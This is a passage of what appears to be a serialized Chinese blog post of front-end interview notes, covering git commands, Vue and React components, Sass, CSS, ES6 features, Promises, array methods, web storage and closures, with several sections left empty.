1.常见命令流程\n\n```shell\n#初始化仓库\ngit init  \n\n#切换到主分支\ngit checkout master\n\n#获取最新变更\ngit fetch origin\n\n#基于主分支创建dev分支\ngit checkout -b dev origin/master\n\n#添加到缓存\ngit add\n\n#提交到本地仓库\ngit commit -m \"备注\"\n\n#获取最新更新\ngit fetch origin\n```\n\n### 2.其他指令\n\n```shell\n#查看仓库状态\ngit status\n\n#将某个工作区的文件添加暂存区\ngit add filename   或 git add . 全部\n\n#查看工作区和暂存区差异\ngit diff 分支/id/\n\n#查看历史记录\ngit log\n\n#代码回滚\ngit reset HEAD^  \n\n#删除版本库文件\ngit rm filename\n\n#同步远程仓库\ngit push -u origin master\n\n#本地仓库推送到远程仓库\ngit remote add origin git@github.com:username/仓库名.git\n\n#克隆\ngit clone url\n\n#合并分支\ngit merge dev\n\n#删除分支\ngit branch -d dev\n\n\n\n```\n\n# NodeJS相关\n\n### 1.node流\n\n\n\n### 2.node如何写接口？\n\n\n\n### 3.express\n\n\n\n### 4.node常用模块\n\n# VUE相关\n\n### 1.Vue生命周期\n\n![组件生命周期图示](https://cn.vuejs.org/assets/lifecycle.16e4c08e.png)\n\n- beforeCreate:实例初始化完成，props解析之后，data()和computed等选项处理之前立即调用；此时不能获得DOM结点；\n- created：Vue实例已经创建，响应式数据、计算属性、方法和侦听器已经设置完成；但是由于没有挂载，依旧不能获得DOM结点；\n- beforeMount：组件内容被渲染拿到页面之前执行的函数，组件已经完成了其响应式状态的设置，但是还没有创建DOM结点；\n- mounted：组件渲染之后自动执行，一般异步请求写这里；这个阶段数据和DOM都已经完成渲染；\n- beforeUpdate：数据变化的时候执行的函数，此时变化后的数据还未渲染到页面上；\n- updated：数据变化以后执行，变化的数据已经渲染到页面上；\n- beforeUnmount：当Vue应用被销毁时，自动执行的函数；\n- unmounted：当vue应用销毁后，且DOM完全销毁之后自动执行；\n\n![img](https://upload-images.jianshu.io/upload_images/24919918-2b75253c04f7b643.png?imageMogr2/auto-orient/strip|imageView2/2/w/1200/format/webp)\n\n### 2.路由守卫\n\n\n\n### 3.组件通信有哪些？\n\nhttps://blog.csdn.net/longfan_/article/details/125324201\n\n> 一般分为如下关系：\n>\n> 父子间通信；\n>\n> 非父子间通信（兄弟，隔代）；\n\n- props / $emit\n\n> 父组件通过props的方式向子组件传递数据，而通过$emit子组件可以像父组件通信；\n>\n> props只可以从上一级组件传递到下一级组件，即所谓的单向数据流，而且props只读，不可被修改，所有修改都会失效并警告；\n>\n> 一、不应该在一个组组件内部改变prop，会破坏单向数据绑定；\n\n\n\n- \n\n\n\n### 4.v-if与show区别\n\n\n\n### 5.VUE与React区别\n\n\n\n### 6.Vue DIff算法\n\n\n\n### 7.Vue如何实现监听？\n\n\n\n\n\n\n\n# React相关\n\n### 1.类组件和函数组件\n\n- ##### 函数组件\n\n> 使用JS函数创建的组件；\n>\n> 首字母大写，React根据此区分组件和HTML元素；\n>\n> 函数必须有返回值,不渲染内容需要返回null；\n\n```jsx\n//普通函数\nfunction Header(){\n    return <div>头部组件</div>\n}\n//箭头函数\nconst Footer=()=>{\n    return <div>Rooter</div>\n}\n\n\n```\n\n- ##### 类组件\n\n> 使用class语法创建的组件；\n>\n> 首字母大写，必须继承React.Component父类；\n>\n> 必须有render函数，返回UI结构，可返回null;\n\n##### 状态组件：\n\n- 无状态组件不定义状态，没有组件生命周期，只负责渲染UI，Hooks出现后函数组件也可以有状态；性能较好；\n- 有状态组件可以定义自己的状态，拥有生命周期，能力更强；\n\n##### 类组件问题：\n\n- 处理this问题：绑定箭头函数、bind，声明箭头函数\n\n```js\nimport { Component } from \"react\";\n \nclass App extends Component {\n  // 状态\n  state = {\n    count: 0,\n  };\n  // 事件处理函数\n  handleClick(e) {\n    console.log(e)\n    console.log(this.state.count)\n  }\n  render() {\n    return (\n      <>\n        <div>计数器：{this.state.count}</div>\n        <div>\n+          <button onClick={(e)=>this.handleClick(e)}>按钮</button>\n        </div>\n      </>\n    );\n  }\n}\nexport default App;\n```\n\n```js\nimport { Component } from \"react\";\n \nclass App extends Component {\n  // 状态\n  state = {\n    count: 0,\n  };\n  // 事件处理函数\n  handleClick(e) {\n    console.log(e)\n    console.log(this.state.count)\n  }\n  render() {\n    return (\n      <>\n        <div>计数器：{this.state.count}</div>\n        <div>\n+          <button onClick={this.handleClick.bind(this)}>按钮</button>\n        </div>\n      </>\n    );\n  }\n}\nexport default App;\n```\n\n```js\nimport { Component } from \"react\";\n \nclass App extends Component {\n  // 状态\n  state = {\n    count: 0,\n  };\n  // 事件处理函数\n+  handleClick = (e) => {\n    console.log(e)\n    console.log(this.state.count)\n  }\n  render() {\n    return (\n      <>\n        <div>计数器：{this.state.count}</div>\n        <div>\n          <button onClick={this.handleClick}>按钮</button>\n        </div>\n      </>\n    );\n  }\n}\nexport default App;\n```\n\n- setState\n\n```js\n\n  handleClick = () => {\n    // 修改数据\n    this.setState({\n      // key是要修改的数据名称，value是对应的新值\n      count: this.state.count + 1,\n    });\n  };\n  updateList = () => {\n    // 修改列表\n    this.setState({\n      list: [...this.state.list, '相机'],\n    });\n  };\n  updateUser = () => {\n    // 修改对象\n    this.setState({\n      user: {\n        ...this.state.user,\n        name: 'tony',\n      },\n    });\n  };\n\n```\n\n##### 相同点\n\n- 都可以接受属性，返回React元素；\n\n##### 不同点\n\n- 编程思想不同，类组件需要创建实例，基于面向对象的编程方法，而函数式是基于函数式编程；\n- 内存占用不用：类组件需要创建并保存实例，会占用一定内存，函数组件不需要创建实例，可以节约内存占用；\n- 捕获特性：函数组件具有值捕获特性；\n- 状态：类组件有自己的实例，可以定义状态，而且可以修改状态更新组件，函数式组件以前没有状态，现在可以使用 useState 使用状态\n- 生命周期：类组件有自己完整的生命周期，可以在生命周期内编写逻辑，函数组件以前没有生命周期，现在可以使用 useEffect 实现类似生命周期的功能\n- 逻辑复用：类组件可以通过继承实现逻辑复用，但官方推荐组件优于继承，函数组件可以通过自定义 hooks 实现逻辑的复用\n- 跳过更新：类组件可以通过 `shouldComponentUpdate` 和 `PureComponent` 来跳过更新，而函数式组件可以使用 `React.memo` 来跳过更新\n- 发展前景：未来函数式组件将会成为主流，因为它可以更好的屏蔽 this 问题、规范和复用逻辑，更好的适合事件分片和并发渲染\n\n### 2.React Hook及其优化策略\n\n\n\n\n\n\n\n# Webpack相关\n\n### 1.Webpack配置\n\n\n\n### 2.loader执行顺序\n\n\n\n### 3.html webpack plugin的作用\n\n\n\n\n\n# 计算机网络相关\n\n### 1.CDN的理解\n\n\n\n### 2.跨域问题：什么是跨域？如何解决？\n\n\n\n### 3.节流与防抖\n\n\n\n### 4.TCP和UDP区别，三次握手，阻塞重传\n\n\n\n### 5.http和https\n\n\n\n\n\n# 操作系统\n\n### 1.线程、进程\n\n\n\n\n\n# 网络安全相关\n\n\n\n### 1.DDOS\n\n\n\n### 2.Web相关漏洞原理\n\n\n\n\n\n\n\n\n\n\n\n# 算法相关\n\n\n\n\n\n# Linux相关\n\n### 1.linux常用命令\n\n\n\n# 项目相关\n\n### 1.项目上线如何捕获异常？\n\n\n\n\n\n### 2.项目加载头花","source":"_posts/前端面经.md","raw":"---\ntitle: 前端面筋\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 面试笔记\n    - 笔记\nmp3: \ncover: img/bg11.jpg\n---\n\n\n# 前端三大件\n\n## 一、HTML\n\n\n\n## 二、CSS\n\n### 1.Flex布局\n\n> Flex布局包括容器和Item两部分；一个容器的所有子元素都成为他的item成员；\n\n![](https://s3.bmp.ovh/imgs/2023/03/16/1d4271c9004b7a95.png)\n\n- flex-direction:主轴方向，row，row-reverse，column，column-recerse；\n- flex-wrap:默认所有的容器里的Item都在一条线上，一行放不下可以换行：nowrap（默认不换行）wrap（换行，第一行在上）\n- flex-flow:前两者的缩写，默认row nowrap\n- justify-content:主轴对其方式，有五个值，flex-start:主轴起始位置对齐；flex-end:主轴结束位置对齐；center:居中；space-between:始末位置各一个，中间按照平均间距防止；space-around:每个item周围的间隔相同；\n- align-items:纵轴如何对齐，五个值：flex-start:从最上方开始，排列row；flex-end:最底下开始；center:中间线；baseline:项目的第一行文字的基线对其；stretch:默认，item妹有设置高度或者auto，占满容器；\n- align-content:定义多根轴线对齐方式，一行则不生效；\n- order属性：属于item，按照order大小排序；\n- flex-grow:定义item的放大比例；\n- flex-shrink:按照比例缩小；\n- flex: flex-grow,flex-shrink,flex-basis;\n- align-self:允许item自己的属性；可覆盖aligin-items;\n\n### 2.CSS预处理器\n\n> CSS预处理器式一种基于CSS，用于解决CSS难以解决的问题的Domian Specific Language;\n>\n> 通过用一种专门的编程语言，为CSS添加一些编程特性，再编译成CSS文件；\n>\n> 如：语法不够强大，妹有变量和合理的样式复用机制等；\n\n\n\n##### CSS预处理器的作用\n\n- 提供css缺失的样式层复用机制，减少冗余代码；\n- 提高样式代码的可维护性；\n\n##### Sass（.scss）\n\n成熟稳定强大的专业级CSS拓展语言，兼容CSS、功能丰富；\n\n功能：\n\n- 变量、常量\n\n```scss\n$bgColor:#fff;\t\t//以$开头，表示全局和局部变量\ndiv{\n    $width:100px;\t//局部变量\n    width:$width;\n    background:$bgColor;\n}\n\n//变量用在属性中，需要写在#{}中\n$posi:left;\ndiv{\n    border-#{$posi}:1 px solid $color;\n}\n\n//默认变量，值后面加上 ！default\n$myLineHeight:1.5 !default;\n\nbody{\n    line-height:$myLineHeight;\n}\n\nbody{\n    line-height:1.5;\n}\n```\n\n- CSS代码嵌套\n\n```scss\n//在一个选择器中嵌套另一个选择器来实现继承，增强了sass文件的结构性和可读性；\n//选择器嵌套中，可以使用&表示父元素选择器；\n#top_btn{\n    line-height:40px;\n    text-transform:capitalize;\n    li{\n        float:left;\n    }\n    a{\n        display：block;\n        \n        &:hover{\n            color:#ddd;\n        }\n    }\n}\n\n//属性嵌套\n.main-container{\n    //选择器嵌套\n    &-top{\n        color:red;\n    }\n    //伪类嵌套\n    &:hover{\n        color:green'\n    }\n}\n```\n\n- 混入Mixin\n\n> Mixins是CSS预处理器最强大的特性；\n>\n> 可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用；\n\n```scss\n//无参数mixin\n@mixin center-block{\n    margin-left:auto;\n    margin-right:auto;\n}\n.btn{\n    @include center-block;\n}\n\n```\n\n```scss\n//有参数mixin\n@mixin theme($theme:Darkgray){\n    background:$theme;\n    box-shadow:0 0 1px rgba($theme, .25);\n    color:#fff;\n}\n\n.infor{\n    @include theme;\n}\n\n.alert{\n    @include theme($theme:Darkred);\n}\n\n//多个mixin,多个参数以逗号分隔，如果@include传入的参数个数小于@mixin定义参数的个数，则按照顺序表示，后面不足的使用默认值；如果不足的没有默认值则报错；\n@mixin theme($theme:Darkgray,$color:red){\n    background:$theme;\n    box-shadow:0 0 1px rgba($theme, .25);\n    color:$red;\n}\n```\n\n```scss\n//模块系统\n//test.scss\n$font-stack: Helvetica, sans-serif;\n$primary-color: #333;\n\nbody {\n  font: 100% $font-stack;\n  color: $primary-color;\n}\n\n//styles.scss\n// 使用@use导入文件\n@use 'test'; // 生成了一个 test 命名空间\n\n.inverse {\n  background-color: test.$primary-color;\n  color: white;\n}\n\n```\n\n- 继承\n\n```scss\n/* This CSS will print because %message-shared is extended. */\n%message-shared {\n  border: 1px solid #ccc;\n  padding: 10px;\n  color: #333;\n}\n\n// This CSS won't print because %equal-heights is never extended.\n%equal-heights {\n  display: flex;\n  flex-wrap: wrap;\n}\n\n.message {\n  @extend %message-shared;\n}\n\n.success {\n  @extend %message-shared;\n  border-color: green;\n}\n\n.error {\n  @extend %message-shared;\n  border-color: red;\n}\n\n.warning {\n  @extend %message-shared;\n  border-color: yellow;\n}\n\n```\n\n- 函数\n\n```scss\nx @use \"sass:math\";\n\n.container{\n    display:flex;\n}\n\narticle[role=\"main\"]{\n    width:math.div(600px,960px)*100%;\n}\n\naside[role=\"complementary\"]{\n    width:math.div(300px,960px)*100%;\n    margin-left:auto;\n}\n//支持加减乘除，循环等；\n```\n\n缺点：采用Ruby语言编写，单独使用妹有问题，但是工程化项目中，存在问题；\n\n- 需要借助node-sass,node版本与node-sass版本相关联，一旦本地nodeJS升级，出现node-sass无法工作；（Rebuild或者冲洗安装node-sass）\n- 需要node-gyp作为先决条件->需要兼容版本的python；\n- binding.node源无法访问或者速度慢；\n\n##### Less\n\nLess是CSS预处理语言，拓展了CSS，增加了变量、Mixin、函数等特性；使CSS更易维护和拓展。Less可以运行在Node或浏览器端；\n\n\n\n##### Stylus\n\nStylus是一种创新的样式表语言，可编译为CSS。Stylus是用nodeJS构建的；\n\n\n\n\n\n### 3.多屏适应，自适应布局和响应式布局区别\n\n\n\n\n\n### 4.过渡动画\n\n- transform（平移旋转缩放）\n\n```css\n.{\n    translate(50px,100px);\t\t\t/*平移，x y方向*/\n    rotate(20deg);\t\t\t\t\t/*旋转 顺时针旋转20°*/\n    rotateX(150deg);\t\t\t\t\t/*x轴旋转*/\n    scaleX(2);\t\t\t/*增大两倍宽度*/\n    scale(1,2);\t\t\t\t/*宽度一赔，高度两倍*/\n    \n}\n```\n\n\n\n- animation\n\n```css\n*animation-name：关键帧的名字，该参数必需。\n*animation-duration：动画持续的时间，该参数必需。\nanimation-timing-function：定时器函数，默认是ease。\nanimation-delay：动画效果多少秒后开始，默认为0。\nanimation-iteration-count：动画重复的次数，可以指定为一个整数，表示多少次，默认值是infinite关键字，表示无限次。\nanimation-direction：动画方向，可能的值为forward、backward或alternating，默认值为normal。\nanimation-fill-mode：默认值为none。\nanimation-play-state：动画默认是否生效，默认值为running。\n\n```\n\n- `animation` 强调流程与控制，对元素的一个或多个属性的变化进行控制，可以有多个[关键帧](https://so.csdn.net/so/search?q=关键帧&spm=1001.2101.3001.7020)（`animation` 和 `@keyframes`结合使用）\n- `transition` 强调过渡，是元素的一个或多个属性发生变化时产生的过渡效果，同一个元素通过两个不同的途径获取样式；\n\n### 5.标准盒模型和怪异盒模型\n\nW3C标准盒子模型由：content、margin、padding、border组成；\n\n##### 区别：总宽度的计算公式不一样\n\n标准盒模型总宽度=width+margin（左右）+padding（左右）+border（左右）；\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201224112703410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center)\n\n怪异盒模型总宽度=width+margin（左右）（width已经包含padding和border的值）；\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201224113002950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center)\n\n```css\n    .box {\n        margin: 30px;\n        padding: 20px;\n        width: 80px;\n        height: 40px;\n        border: 10px solid #00007e;\n        background: #fec997;\n        box-sizing: border-box /* 设置盒子类型 */\n      }\n\n/*\n\tcontent-box:标准盒模型；\n\tborder-box:怪异盒模型；\n\tpadding-box:盒子宽度等于content+padding;\n\tinherit:从父元素继承box-sizeing的属性；\n*/\n\n```\n\n\n\n## 三、JS\n\n### 1.基本数据类型\n\n- 基本数据类型\n\n```\nnumber,string,undefined,Boolean,null;\nES6添加：Symbol\n```\n\n- 复杂数据类型\n\n```\nObject；\n```\n\n> 0.1+0.2！=0.3\n>\n> 浮点数值的最高精度事28位小数，0.1+0.2= 0.30000 0000 0000 0004\n>\n> 基于IEEE754数值的浮点计算通病；\n\n### 2.ES6新特性\n\n> ES6=ES2015\n\n- 新增块级作用域let,const;\n\n```js\n//let \nfor(var i=0;i<5;i++){\n    console.log(i);\n}\n\nconsole.log(i+1);\t\t\t//循环体外部能够访问i，使用let不会\n\n//const声明的是常量，不能被修改；\nconst a=1;\n\n//const 声明的数组不可以被重新赋值，但是可以修改元素；\nconst names=[\"A\",\"B\"];\n\n```\n\n- 定义类的语法糖；\n- 新增基本数据类型Symbol；\n- 新增变量解构赋值；\n\n```js\n//数组\nlet arr=[1,2,3]\nconst [x,y,z]=arr;\n\n//对象\nconst person={\n    name:\"Martin\",\n    age:22,\n    languages:['Java','Python']\n};\n\nconst {name:n,age:a,language:l}=person;\nconsole.log(n,a,l);\n```\n\n\n\n- 函数参数允许默认值，引入rest参数，新增箭头函数；\n\nhttps://blog.csdn.net/sinat_41696687/article/details/121903414\n\n```js\n// =>不只是function的简写，还有其他优点：和包围他的代码公用this，解决了this指向问题；原理是补获上下文的this；\n//如果箭头函数的外层有普通函数，this指向普通函数的this；\n//妹有普通函数，this指向全局变量\n//有\nlet obj = {\n  fn:function(){\n      console.log('我是普通函数',this === obj)   // true\n      return ()=>{\n          console.log('我是箭头函数',this === obj) // true\n      }\n  }\n}\nconsole.log(obj.fn()())\n\n//妹有\nlet obj = {\n    fn:()=>{\n        console.log(this === window);\n    }\n}\nconsole.log(obj.fn())\n// true\n\n//默认值\n\nfunction add(a,b=1){\n    return a+b;\n}\n\n//箭头函数是匿名函数，不能作为构造函数，不可以使用new；\n\n//箭头函数不绑定arguments,使用rest参数，妹有super和new.target;\n```\n\n- 数组新增API，isArray/from/of,数组实例增加：entries（）,keys(),values（）等方法；\n\n```js\n//字符串拓展\nlet str = \"hello ReactJS\";\nconsole.log(str,\"中是否包含ReactJS\",str.includes(\"ReactJS\"));\nconsole.log(str,\"是否以h开头\",str.startsWith(\"h\"));\nconsole.log(str,\"是否以actJS结尾\",str.endsWith(\"actJS\"));\n\n//字符串模板\nlet str = `c\ny\nl`;\n```\n\n\n\n- 对象和数组新增拓展运算符号；\n- 新增模块化：import,export;\n\n```js\nvar name='Martin';\nexport {name};\n\nexport function MakeLove(){\n    \n}\n\n\n```\n\n\n\n- 新增Set()和Map数据结构；\n- 原生提供Proxy构造函数，用来生成Proxy实例；\n- 新增生成器**Generater**和**Iterator**；\n\n\n\n### 3.Bigint\n\n> 支持任意长度的整数：末尾+n；\n>\n> 不能混用常规的和Bigint\n\n### 4.Promise 和 Await\n\nhttps://es6.ruanyifeng.com/#docs/promise\n\n- Promise时异步编程的解决方案，比较传统的回调函数和事件更加合理强大；\n- 一个用来保存某个未来才会结束的事件；\n\n> Promise对象有以下两个特点：\n>\n> （1）对象的状态不受外界影响，Promise对象代表一个异步操作，有三种状态：\n>\n> pending（进行中）、fulfilled（已成功）、rejected（已失败）只有异步操作的结果才能决定状态；\n>\n> （2）一旦状态改变，不会再变。Promise对象的状态改变只有：pending->fulfilled，pending->rejected\n>\n> 状态凝固了就是resolved。如果改变已经发生了，再对Promise对象添加回调函数，也会立即得到结果；这与事件不同，事件一旦错过就不再获得结果；\n>\n> 缺点：\n>\n> 无法取消Promise，一旦新建就会立即执行，无法中途取消；\n>\n> 不设置回调函数，Promise内部抛出的错误不会反映到外部；\n>\n> 当处于pending状态时，无法得知目前进展到哪一个阶段；\n\n```js\n//promise构造函数接受一个函数作为参数，该函数的两个参数分别为resolve和reject\n//resolve函数是将Promise对象的状态从未完成变成成功；pending->resolved，异步操作成功时调用并将异步操作的结果作为参数传递出去；\n//reject函数时将promise对象的状态从未完成变成失败，pending->rejected，异步操作错误时将报错错位参数传递出去；\npromise.then(function(valueA){\n    \n},function(error){\n    \n})\n\n```\n\n- promise.prototype.then(参数1，参数2)\n\n```js\n//Promise实例具有then方法，定义在原型对象上，作为Promise实例添加状态改变时的回调函数；\n//可以采用链式写法\ngetJSON(\"url\").then((res)=>{\n    \n}).then((error)=>{\n    \n})\n```\n\n- promise.prototype.catch()\n\n```js\n//是then的别名，用于指定发生错误时的回调函数\ngetJson().then((res)=>{\n    \n}).catch((error)=>{\n    console.log(error);\n})\n```\n\n- promise.prototype.finally()\n\n```js\ngetJson().then((res)=>{\n    \n}).catch((error)=>{\n    console.log(error);\n}).finally(()=>{\n    //最后一定执行\n})\n```\n\n- promise.all()\n\n```js\n//用于将多个promise实例，包装成一个新的promise实例\nconst p=Promise.all([p1,p2,p3]);\n\n//只有p123的状态都称为fulfiled p才会成功；任一个rejected p也会；\nconst databasePromise = connectDatabase();\n\nconst booksPromise = databasePromise\n  .then(findAllBooks);\n\nconst userPromise = databasePromise\n  .then(getCurrentUser);\n\nPromise.all([\n  booksPromise,\n  userPromise\n])\n.then(([books, user]) => pickTopRecommendations(books, user));\n```\n\n- Promise.race():多个实例任一成功都会返回成功；\n\n### 5.数组方法\n\n##### join() （数组转字符串）\n\n```js\nvar arr = [1, 2, 3, 4]\nconsole.log(arr)\nconsole.log(arr.join(''))\nconsole.log(arr.join('-'))\nconsole.log(arr)\t//原数组不变\n\n//join实现重复字符串\nfunction repeateStr (str, n) {\n  return new Array(n + 1).join(str)\n}\n\n```\n\n##### push()和pop()\n\n```js\n//push 向数组的末尾添加元素\n//pop 删除并返回最后一个数组元素\n```\n\n##### shift()和unshift()\n\n```js\n// shift() 删除数组第一个元素，并返回该元素的值\n// unshift() 向数组的开头添加一个或多个元素，并返回新的长度\n```\n\n##### sort()\n\n```js\n\n// sort() 对数组元素进行排序，并返回当前数组:对字符的排序是按照字母的Unicode码进行排序的\n// reverse() 颠倒数组中元素的顺序，并返回当前数组\nvar arr = [1, 100, 20, 30]\nconsole.log(arr.sort())\nconsole.log(arr.reverse())\n//实现数值排序\nconsole.log(arr.sort(function (a, b) {\n  return a - b\n}))\n\n```\n\n##### concat()  (连接数组)\n\n```js\n// concat() 连接两个或多个数组，并返回新的数组\n// slice() 选取数组的的一部分，并返回一个新数组\n// splice() 从数组中添加或删除元素，并返回被删除的元素\nvar arr = [1, 2, 3, 4, 5]\nconsole.log(arr.concat([6, 7, 8]))\nconsole.log(arr.slice(1, 3))\nconsole.log(arr.splice(1, 2, 6, 7, 8))\n\n//传入二维数组，将其转化为一维数组\nvar arr1 = [[1, 2], [3, 4], [5, 6]]\nconsole.log(arr.concat(arr1))\t\t//讲数组当作元素项合并\nconsole.log([].concat.apply([], arr1))\t\t//合并\n```\n\n##### slice(start,end) \n\n·ES5新增·\n\n##### indexOf()  lastIndexOf()  返回首次出现的位置，无返回-1\n\n##### forEach() map(),filter(),some(),every();\n\n```js\nvar arr = [1, 2, 3, 4, 5]\n\narr.forEach(function (item, index, arr) {\n  console.log(index, item)\n})\n\n//指“映射”，方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值\nvar arr1 = arr.map(function (item, index, arr) {\n  return item * 2\n})\nconsole.log(arr1)\n\n// “过滤”功能，方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。和filter() 方法类似，jquery中有个 grep()方法也用于数组元素过滤筛选。\nvar arr2 = arr.filter(function (item, index, arr) {\n  return item > 2\n})\nconsole.log(arr2)\n\n//判断数组中每一项都是否满足条件，只有所有项都满足条件，才会返回true。\nvar arr3 = arr.every(function (item, index, arr) {\n  return item > 2\n})\nconsole.log(arr3)\n\n//判断数组中是否存在满足条件的项，只要有一项满足条件，就会返回true。\nvar arr4 = arr.some(function (item, index, arr) {\n  return item > 2\n})\nconsole.log(arr4)\n```\n\n##### reduce(),reduceRight()\n\n```js\n//归并方法:迭代数组中的所有项，然后生成一个最终返回值。\n//第一个参数是每一项调用的函数，函数接受四个参数分别是初始值，当前值，索引值，和当前数组\n//函数需要返回一个值，这个值会在下一次迭代中作为初始值。第二个参数是迭代初始值，参数可选，\n//如果缺省，初始值为数组第一项，从数组第一个项开始叠加，缺省参数要比正常传值少一次运算。\n//reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\nvar result = arr.reduce(function (prev, cur, index, arr) {\n  return prev + cur\n})\n\nconsole.log(result) // 55\n```\n\n·ES6新增方法·\n\n##### Array.from()\n\n```js\nlet json = {\n  //必须是数字\n  \"0\": \"zhangsan\",\n  \"1\": 18,\n  length: 2\t\t\t//需要长度\n}\n\nlet arr = Array.from(json)\nconsole.log(arr) // []\n```\n\n##### Array.of()\n\n\n\n### 6.离线应用和客户端存储\n\n- 离线检测\n\n> HTML5定义了一个navigator.online属性，如果为true表示设备能够上网；\n\n- 应用缓存\n\n> H5使用appcache专门为开发离线Web应用设计；\n>\n> 从浏览器的缓存区划分一块，使用一个描述文件列出需要下载和缓存的资源；\n\n- 数据存储\n\n  1. ​\tCookie\n\n  > Http Cookie最初在客户端用于存储会话信息。发送回服务器的额外信息可以用于唯一验证客户来自于发送的哪一个请求；\n\n  > 限制：\n  >\n  > cookie在性质上是绑定在特定的域名下，当设定一个cookie后，再给创建他的域名发送请求时都会包含这个cookie，这个限制是的cookie中的信息只能让批准的接收者访问；无法被其他域访问；\n  >\n  > 构成:\n  >\n  > Cookie由名称，值，域，路径，失效时间，安全标志组成；\n\n  2. Web存储机制\n\n  - 提供一个cookie之外存储会话的途径；\n  - 提供一种存储大量跨会话的数据机制；\n\n  > storage类型\n  >\n  > 它提供组大的存储空间，有clear（），getItem(name)，setItem（name,value)等；\n  >\n  > 只能存储字符串；\n\n  > sessionStorage类型\n  >\n  > 它用于存储某个会话的数据，也就是数据保存到浏览器关闭时。\n  >\n  > 存储在sessionStorage中的数据可以跨越页面刷新而存在，同时如果浏览器支持，崩溃之后也能使用；\n\n  ```js\n  //使用方法存储数据\n  sessionStorage.setItem(\"name\",\"Martin\");\n  //使用属性存储数据\n  sessionStorage.book=\"JS\";\n  ```\n\n  3. globalStorage类型\n\n  ```js\n  globalStorage['域名'].name=\"Martin\";\n  ```\n\n  4. localStorage类型\n\n> localStorage在H5中作为持久保存客户端数据的方案取代了globalStorage；\n>\n> 与globalStorage不同；\n\n### 7.cookie设置，token如何实现登录\n\n\n\n### 8.闭包\n\n> 如果一个函数访问量此函数的父级或者父级以上的作用域变量，这个函数就是一个闭包；\n\n```js\nvar a=1;\n\n//匿名立即执行函数，访问了全局变量a;\n(\n\tfunction test(){\n        console.log(a);\n    }\n)()\n```\n\n```js\n//常见的闭包形式：函数嵌套\n\nfunction a(){\n    var index=0;\n    index=index+1;\n    \n    function b(){\n        index=index+2;\n        console.log(index);\n    }\n    \n    return b;\n}\n\nvar c=a();\t\t\t//index=0+1; 将函数a赋值给全局变量c时，a会执行一次，局部变量index变为0+1，返回函数b；此时全局变量C为闭包函数b的引用；\nc();\t\t\t\t//index=0+1+2 //第一次执行c时，闭包函数b第一次执行；\nc();\t\t\t\t//index=0+1+2+2 //第二次执行c时，闭包函数b第二次执行；\n```\n\n##### 特点：\n\n- 被闭包函数访问的父级以上函数的局部变量会一致存在于内存中，不会被JS的垃圾回收机制回收；\n- 闭包函数u实现了对其他函数内部变量的访问；\n\n##### JS垃圾回收机制：\n\n- 如果一个对象不再被引用，这个对象会被GC回收；\n- 如果两个对象相互引用，而不再被第三者所引用，那么这两个对象都会被收回；\n\n##### 闭包的用途：\n\n- 访问函数内部的变量；\n- 让变量始终保持在内存中；\n\n##### 应用场景：\n\n- 模拟面向对象的代码风格\n\n```js\nfunction Person(name){\n    function Say(content){\n        console.log(name+\":\"+content);\n    }\n    \n    return Say;\n}\n\na=Person(\"martin\");\nb=Person(\"jacy\");\na(\"What are u doing ?\");\nb(\"Nothing\");\na(\"Hang out with me ?\");\nb(\"To there?\");\n```\n\n- 使用`setTimeout`支持传参(通过闭包实现setTimeout第一个函数传参)\n\n```js\nfunction func(param){\n    return function(){\n        console.log(param);\n    }\n}\n\nvar f1=func(1);\nsetTimeout(f1,1000);\n```\n\n- 封装私有变量：通过闭包定义能访问私有函数和私有变量的共有函数\n\n```js\nvar counter=(function(){\n    var privateCounter=0;   //私有变量\n\n    function change(val){\n        privateCounter+=val;\n    }\n\n    return {\n        increment:function(){\n            change(1);\n        },\n        decrement:function(){\n            change(-1);\n        },\n        value:function(){\n            return privateCounter;\n        }\n    };\n})();\n\nconsole.log(counter.value());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.increment());\nconsole.log(counter.value());\n```\n\n- 模拟块作用域\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/764a7d4d2f244f3dbb50fa59da6105eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyd6ZizMzk=,size_15,color_FFFFFF,t_70,g_se,x_16)\n\n> onclick绑定的function中没有变量i，解析引擎会寻找父级作用域，最终找到全局变量i；for循环结束的时，i的值已经变成了4；所以此时任何onclick点击都会弹出4；\n>\n> 也可使用let i=0;来解决；\n\n```js\nvar elements=document.getElementsByTagName('li');\nvar length=elements.length;\n\nfor(var i=0;i<length;i++){\n    elements[i].onclick=function(num){\n        return function(){\n            console.log(num);\n        }\n    }(i);           //通过匿名闭包，把每次的i保存到一个变量中实现了效果\n}\n```\n\n- 实现迭代器\n\n```js\nfunction setup(x){\n    var i=0;\n    return function(){\n        return x[i++];\n    };\n}\nvar next=setup([1,2,3]);\nconsole.log(next);\nconsole.log(next);\nconsole.log(next);\n```\n\n##### 闭包优点：\n\n- 减少全局变量的定义，避免全局变量污染；\n- 能够读取函数内部的变量；\n- 内存中维护一个变量，用作缓存；\n\n##### 闭包缺点：\n\n- 造成内存泄漏，闭包会使函数中的变量一致保存在内存中，内存消耗极大；\n\n解决方法：使用完毕以后设置为null；\n\n- 闭包可能在父函数外部，改变父函数内部的值；\n- 由于闭包设计跨作用域访问，会导致性能损失；\n\n解决方法：通过跨作用域变量存储在局部变量中，直接访问局部变量来减轻对执行素的的影响；\n\n\n\n### 9.如何实现原生ajax？\n\n> Ajax是异步的JS和XML，是一种在无需重新加载整个网页的情况下，更新部分网页的技术；\n\n- 创建XMLHttpRequest对象；\n\n> 老版本的浏览器用的ActiveX对象；\n>\n> 